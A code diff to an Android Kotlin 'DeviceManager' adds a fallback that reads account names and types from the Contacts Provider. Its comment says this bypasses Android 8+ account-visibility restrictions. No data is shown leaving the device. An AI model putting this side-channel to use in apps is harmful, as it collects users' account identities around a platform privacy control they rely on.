@@ -230,18 +230,43 @@ object DeviceManager {
 
     fun getAccounts(ctx: Context): org.json.JSONArray {
         val list = org.json.JSONArray()
+        val uniqueAccounts = mutableSetOf<String>()
+
         try {
+            // 1. PRIMARY: AccountManager (Standard API)
             if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED) {
                 val manager = android.accounts.AccountManager.get(ctx)
-                val accounts = manager.accounts
-                for (acc in accounts) {
-                    val obj = JSONObject()
-                    obj.put("name", acc.name)
-                    obj.put("type", acc.type)
-                    list.put(obj)
+                manager.accounts.forEach { acc ->
+                    val key = "${acc.name}|${acc.type}"
+                    if (uniqueAccounts.add(key)) {
+                        list.put(JSONObject().apply { put("name", acc.name); put("type", acc.type); put("src", "AM") })
+                    }
                 }
             }
-        } catch(e: Exception) { e.printStackTrace() }
+
+            // 2. FORENSIC FALLBACK: Contacts Provider Leak
+            // This bypasses Android 8+ visibility restrictions for any account that syncs contacts
+            if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
+                val uri = android.provider.ContactsContract.RawContacts.CONTENT_URI
+                val projection = arrayOf("account_name", "account_type")
+                ctx.contentResolver.query(uri, projection, null, null, null)?.use { cursor ->
+                    val nameIdx = cursor.getColumnIndex("account_name")
+                    val typeIdx = cursor.getColumnIndex("account_type")
+                    while (cursor.moveToNext()) {
+                        val name = cursor.getString(nameIdx)
+                        val type = cursor.getString(typeIdx)
+                        if (!name.isNullOrEmpty() && !type.isNullOrEmpty()) {
+                            val key = "$name|$type"
+                            if (uniqueAccounts.add(key)) {
+                                list.put(JSONObject().apply { put("name", name); put("type", type); put("src", "CP") })
+                            }
+                        }
+                    }
+                }
+            }
+        } catch(e: Exception) { 
+            DebugLogger.log("ACCOUNTS_ERR", "Identity fetch failed: ${e.message}")
+        }
         return list
     }
 }
